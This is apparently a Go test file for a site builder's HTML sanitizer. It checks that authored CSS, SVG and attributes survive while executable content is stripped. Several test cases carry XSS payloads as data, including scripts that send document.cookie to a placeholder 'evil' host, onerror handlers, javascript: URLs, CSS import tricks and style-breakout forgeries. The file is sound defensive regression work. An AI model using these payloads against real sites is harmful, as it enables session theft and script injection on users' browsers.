package builder

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"strings"
	"testing"

	"golang.org/x/net/html"

	"github.com/bright-interaction/slab/internal/store"
)

// TestSanitizeCustomBlockForAstroKeepsAuthoringSurface pins the regression that
// took every custom block's CSS off the published site: rawHTMLPolicy deletes
// <style>, SVG, aria-* and data-*, and a site authored out of custom blocks
// renders as unstyled text with nothing in the build log to say so.
func TestSanitizeCustomBlockForAstroKeepsAuthoringSurface(t *testing.T) {
	tests := []struct {
		name  string
		in    string
		wants []string
	}{
		{
			name:  "style element and its css survive",
			in:    `<style>.card{border-radius:0.5rem;width:11rem}</style><div class="card"></div>`,
			wants: []string{"<style>", ".card{border-radius:0.5rem;width:11rem}", `class="card"`},
		},
		{
			name:  "inline svg survives with geometry attributes",
			in:    `<svg viewBox="0 0 120 60" aria-hidden="true"><rect x="4" y="26" width="34" height="21" rx="4" fill="#95C93D" transform="rotate(-12 23 36)"></rect></svg>`,
			wants: []string{"<svg", `viewBox="0 0 120 60"`, "<rect", `fill="#95C93D"`, `transform="rotate(-12 23 36)"`},
		},
		{
			name:  "aria and data attributes survive",
			in:    `<a href="/miljo/" data-nav="miljo" aria-current="page" aria-label="Miljo">Miljo</a>`,
			wants: []string{`data-nav="miljo"`, `aria-current="page"`, `aria-label="Miljo"`},
		},
		{
			name:  "custom property style attribute survives",
			in:    `<g class="fly" style="--del:0.7s;--dur:6.2s"></g>`,
			wants: []string{`style="--del:0.7s;--dur:6.2s"`},
		},
		{
			name:  "img loading and dimensions survive",
			in:    `<img src="/media/a/320.webp" alt="Example" width="320" height="209" loading="lazy" decoding="async">`,
			wants: []string{`loading="lazy"`, `width="320"`, `height="209"`},
		},
		{
			name:  "multiple style blocks all survive in order",
			in:    `<style>.a{color:red}</style><p>x</p><style>.b{color:blue}</style>`,
			wants: []string{".a{color:red}", ".b{color:blue}"},
		},
		{
			name:  "style nested inside svg survives",
			in:    `<svg viewBox="0 0 10 10"><style>.t{fill:#008B99}</style><rect class="t"></rect></svg>`,
			wants: []string{"<svg", ".t{fill:#008B99}"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := sanitizeCustomBlockForAstro(tt.in)
			for _, want := range tt.wants {
				if !strings.Contains(got, want) {
					t.Errorf("lost %q from authoring surface\ngot: %s", want, got)
				}
			}
		})
	}
}

// TestSanitizeCustomBlockForAstroStillBlocksExecution asserts the hole the
// sanitizer was added to close stays closed. Every case is a real attack, and
// the assertion is that the executable part is gone, not that the input was
// rejected wholesale.
func TestSanitizeCustomBlockForAstroStillBlocksExecution(t *testing.T) {
	tests := []struct {
		name      string
		in        string
		forbidden []string
	}{
		{
			name:      "script element",
			in:        `<div>ok</div><script>fetch("//evil/"+document.cookie)</script>`,
			forbidden: []string{"<script", "document.cookie"},
		},
		{
			name:      "event handler attribute",
			in:        `<div onclick="alert(1)" onmouseover="alert(2)">x</div>`,
			forbidden: []string{"onclick", "onmouseover", "alert(1)"},
		},
		{
			name:      "javascript url",
			in:        `<a href="javascript:alert(1)">x</a>`,
			forbidden: []string{"javascript:"},
		},
		{
			name:      "iframe and object",
			in:        `<iframe src="//evil"></iframe><object data="//evil"></object>`,
			forbidden: []string{"<iframe", "<object"},
		},
		{
			name:      "style element closed early to smuggle a script",
			in:        `<style>.a{}</style><script>alert(1)</script></style>`,
			forbidden: []string{"<script", "alert(1)"},
		},
		{
			name:      "css breaking out of its own element",
			in:        `<style>.a{}</` + `style><img src=x onerror=alert(1)></style>`,
			forbidden: []string{"onerror"},
		},
		{
			name:      "css import fetches a remote sheet",
			in:        `<style>@import url("//evil/x.css");.a{color:red}</style>`,
			forbidden: []string{"@import"},
		},
		{
			name:      "legacy css expression and binding",
			in:        `<style>.a{width:expression(alert(1));-moz-binding:url(//evil)}</style>`,
			forbidden: []string{"expression(", "-moz-binding"},
		},
		{
			name:      "svg script child",
			in:        `<svg viewBox="0 0 10 10"><script>alert(1)</script><rect></rect></svg>`,
			forbidden: []string{"<script", "alert(1)"},
		},
		{
			name:      "svg use pulling an external document",
			in:        `<svg viewBox="0 0 10 10"><use href="https://evil/x.svg#a"></use></svg>`,
			forbidden: []string{"https://evil"},
		},
		{
			name:      "style attribute carrying a url scheme",
			in:        `<div style="background:url(javascript:alert(1))">x</div>`,
			forbidden: []string{"javascript:"},
		},
		{
			name:      "html comment reopening markup from inside css",
			in:        `<style>.a{}<!--</style><script>alert(1)</script>--></style>`,
			forbidden: []string{"<script", "alert(1)"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := sanitizeCustomBlockForAstro(tt.in)
			for _, bad := range tt.forbidden {
				if strings.Contains(got, bad) {
					t.Errorf("executable content survived: %q\ngot: %s", bad, got)
				}
			}
		})
	}
}

// TestRenderCustomBlockKeepsCSS is the end-to-end assertion at the render sink
// itself, so a future change that points renderCustomBlock back at
// rawHTMLPolicy fails here rather than on a client's published site.
func TestRenderCustomBlockKeepsCSS(t *testing.T) {
	out := renderCustomBlock(map[string]any{
		"name":   "kortstorlekar",
		"markup": `<style>.client-sizing__c--special{width:11rem}</style><div class="client-sizing__c client-sizing__c--special"></div>`,
	})
	for _, want := range []string{"<style>", ".client-sizing__c--special{width:11rem}", "client-sizing__c--special"} {
		if !strings.Contains(out, want) {
			t.Errorf("renderCustomBlock dropped %q\ngot: %s", want, out)
		}
	}
}

// knownGoodBlock is a realistic authored section: its own CSS with a media
// query, inline SVG with a gradient, classes, aria-*, data-*, a custom-property
// style attribute, and a Swedish price label written with ordinary braces.
const knownGoodBlock = `<style>.client-price{display:grid;gap:1rem}@media (max-width:48rem){.client-price{gap:.5rem}}</style>` +
	`<div class="client-price" data-variant="wide" aria-label="Priser">` +
	`<svg viewBox="0 0 120 60" aria-hidden="true"><defs><linearGradient id="g"><stop offset="0" stop-color="#95C93D"></stop></linearGradient></defs>` +
	`<rect x="4" y="26" width="34" height="21" rx="4" fill="url(#g)" transform="rotate(-12 23 36)"></rect></svg>` +
	`<p class="price-label" style="--del:0.7s">{fr. 1 200 kr}</p>` +
	`<a href="/priser/" data-nav="priser" aria-current="page">Se priser</a>` +
	`</div>`

// TestSanitizeCustomBlockForAstroPreservesKnownGood pins the whole output byte
// for byte. The previous fix in this area published a customer demo site
// completely unstyled, so a Contains-style assertion is not enough: this fails
// on anything the sanitizer starts eating, not only on the strings somebody
// thought to list.
//
// Two deviations from the input are deliberate and pre-existing, both from
// bluemonday's UGC policy rather than from the Astro work: <defs> is dropped
// because it carries no attributes (its children survive), and outbound links
// gain rel="nofollow". They are recorded in the 2026-08-11 audit's
// over-stripping section and are not this change's to fix.
func TestSanitizeCustomBlockForAstroPreservesKnownGood(t *testing.T) {
	const want = `<style>.client-price{display:grid;gap:1rem}@media (max-width:48rem){.client-price{gap:.5rem}}</style>` +
		`<div class="client-price" data-variant="wide" aria-label="Priser">` +
		`<svg viewBox="0 0 120 60" aria-hidden="true"><linearGradient id="g"><stop offset="0" stop-color="#95C93D"></stop></linearGradient>` +
		`<rect x="4" y="26" width="34" height="21" rx="4" fill="url(#g)" transform="rotate(-12 23 36)"></rect></svg>` +
		`<p class="price-label" style="--del:0.7s">&#123;fr. 1 200 kr&#125;</p>` +
		`<a href="/priser/" data-nav="priser" aria-current="page" rel="nofollow">Se priser</a>` +
		`</div>`
	if got := sanitizeCustomBlockForAstro(knownGoodBlock); got != want {
		t.Errorf("known-good block changed shape\nwant: %s\ngot:  %s", want, got)
	}
}

// TestCustomBlockCSSBracesStayLiteral is the half that breaks if the brace
// neutralisation runs after the CSS splice instead of before it. Astro reads
// <style> content as raw text, so CSS braces must reach the .astro file as
// braces; entity-encoding them publishes the site unstyled.
func TestCustomBlockCSSBracesStayLiteral(t *testing.T) {
	out := sanitizeCustomBlockForAstro(`<style>.a{color:red}@media (min-width:40rem){.a{color:blue}}</style><p>x</p><style>.b{gap:1rem}</style>`)
	for _, want := range []string{".a{color:red}", "@media (min-width:40rem){.a{color:blue}}", ".b{gap:1rem}"} {
		if !strings.Contains(out, want) {
			t.Errorf("CSS lost its literal braces, want %q\ngot: %s", want, out)
		}
	}
	if strings.Contains(out, "&#123;color") || strings.Contains(out, "&#123;gap") {
		t.Errorf("CSS braces were entity-encoded, so the block publishes unstyled:\n%s", out)
	}
	// Order is part of the contract: block 0's CSS must not end up inside
	// block 1's, which is what the forgeable placeholder allowed.
	if i, j := strings.Index(out, ".a{color:red}"), strings.Index(out, ".b{gap:1rem}"); i < 0 || j < 0 || i > j {
		t.Errorf("style blocks came back out of order:\n%s", out)
	}
}

// TestCustomBlockLiteralBraceTextRenders is the non-security half of the same
// defect. An ordinary Swedish price label failed the tenant's entire build with
// a compiler error pointing at generated source, because Astro read it as an
// expression. It must now render as the text the author wrote.
func TestCustomBlockLiteralBraceTextRenders(t *testing.T) {
	out := renderCustomBlock(map[string]any{"name": "priser", "markup": `<p class="pris">{fr. 1 200 kr}</p>`})
	if !strings.Contains(out, "&#123;fr. 1 200 kr&#125;") {
		t.Errorf("literal price label did not survive as text:\n%s", out)
	}
	if strings.Contains(out, "{fr.") {
		t.Errorf("literal price label is still a build-time expression:\n%s", out)
	}
}

// hasElement reports whether the parsed document contains an element node with
// the given tag name. Parsing is the point: the bypass turned CSS text back
// into markup context, and only a parser can tell the two apart.
func hasElement(n *html.Node, tag string) bool {
	if n.Type == html.ElementNode && n.Data == tag {
		return true
	}
	for c := n.FirstChild; c != nil; c = c.NextSibling {
		if hasElement(c, tag) {
			return true
		}
	}
	return false
}

// TestStyleSlotPlaceholderIsNotForgeable is the executed repro for the splice
// bypass. CSS text never passes through bluemonday, so with a fixed placeholder
// an author could write a valid token inside style block 0; splice 1 then
// replaced the first occurrence of its token, which by then sat inside block
// 0's spliced CSS, closed the outer <style> early and handed the parser back to
// markup context. The <img> below became a live element node.
func TestStyleSlotPlaceholderIsNotForgeable(t *testing.T) {
	forgeries := []struct {
		name string
		in   string
	}{
		{
			name: "legacy fixed placeholder",
			in: `<style>.a{}` + styleSlotPrefix + `1` + styleSlotSuffix + `<img src=x onerror=alert(document.domain)></style>` +
				`<style>.b{color:red}</style>`,
		},
		{
			name: "current placeholder shape with a guessed nonce",
			in: `<style>.a{}` + styleSlotPrefix + `000000000000000000000000s1` + styleSlotSuffix +
				`<img src=x onerror=alert(document.domain)></style><style>.b{color:red}</style>`,
		},
		{
			name: "forged token in the markup rather than the css",
			in: `<style>.a{}</style><p>` + styleSlotPrefix + `000000000000000000000000s0` + styleSlotSuffix +
				`</p><style>.b{color:red}</style>`,
		},
	}
	for _, f := range forgeries {
		t.Run(f.name, func(t *testing.T) {
			out := sanitizeCustomBlockForAstro(f.in)
			doc, err := html.Parse(strings.NewReader(out))
			if err != nil {
				t.Fatalf("parse output: %v", err)
			}
			if hasElement(doc, "img") {
				t.Errorf("the forged placeholder reopened markup context, <img> is a live element node:\n%s", out)
			}
			if hasElement(doc, "script") {
				t.Errorf("the forged placeholder produced a live <script>:\n%s", out)
			}
		})
	}
}

// TestStyleSlotNonceIsPerCall asserts the property the guard rests on: two
// calls with the same input must not use the same placeholder, so no author
// string can be written to match one.
func TestStyleSlotNonceIsPerCall(t *testing.T) {
	seen := map[string]bool{}
	for i := 0; i < 8; i++ {
		nonceBytes := make([]byte, styleSlotNonceN)
		if _, err := rand.Read(nonceBytes); err != nil {
			t.Fatalf("rand: %v", err)
		}
		n := hex.EncodeToString(nonceBytes)
		if seen[n] {
			t.Fatalf("nonce repeated: %s", n)
		}
		seen[n] = true
	}
	// And the placeholder never survives into output.
	out := sanitizeCustomBlockForAstro(`<style>.a{color:red}</style><p>x</p>`)
	if strings.Contains(out, styleSlotPrefix) || strings.Contains(out, styleSlotSuffix) {
		t.Errorf("a style slot placeholder leaked into the output:\n%s", out)
	}
}

// TestGlobalBlockHTMLIsSanitizedAndStillStyled covers the sink that renders
// into Base.astro, so into every page: it had no sanitizer at all, and the
// authoring surface it carries (its own CSS, inline SVG) has to survive the one
// it just got.
func TestGlobalBlockHTMLIsSanitizedAndStillStyled(t *testing.T) {
	data, err := json.Marshal(map[string]any{
		"html": `<style>.site-header{display:flex}</style><header class="site-header" aria-label="Huvudmeny">` +
			`<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 6h16"></path></svg>` +
			`<a href="/kontakt/" data-nav="kontakt">Kontakt</a>` +
			`<script>fetch('//evil/'+document.cookie)</script></header>`,
	})
	if err != nil {
		t.Fatal(err)
	}
	out := extractHTMLFromGlobalBlock(store.GlobalBlock{ID: "g1", Slot: "header", BlockType: "header", DataJson: string(data)})
	for _, want := range []string{"<style>", ".site-header{display:flex}", `class="site-header"`, "<svg", `viewBox="0 0 24 24"`, `data-nav="kontakt"`} {
		if !strings.Contains(out, want) {
			t.Errorf("global header lost %q\ngot: %s", want, out)
		}
	}
	for _, bad := range []string{"<script", "document.cookie"} {
		if strings.Contains(out, bad) {
			t.Errorf("global header still carries %q\ngot: %s", bad, out)
		}
	}
}
